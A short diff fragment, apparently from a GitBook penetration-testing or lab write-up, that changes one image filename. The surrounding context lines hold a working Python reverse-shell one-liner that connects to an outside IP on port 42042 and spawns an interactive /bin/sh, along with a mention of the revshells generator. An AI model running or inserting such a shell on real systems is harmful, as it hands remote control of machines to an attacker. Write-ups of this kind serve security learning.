@@ -106,7 +106,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 .168.49.66",42042));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Utilizing exploit to craft us a reverse shell!</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (6).png" alt=""><figcaption><p>Utilizing exploit to craft us a reverse shell!</p></figcaption></figure>
 
 * Or you could simply use revshells
 
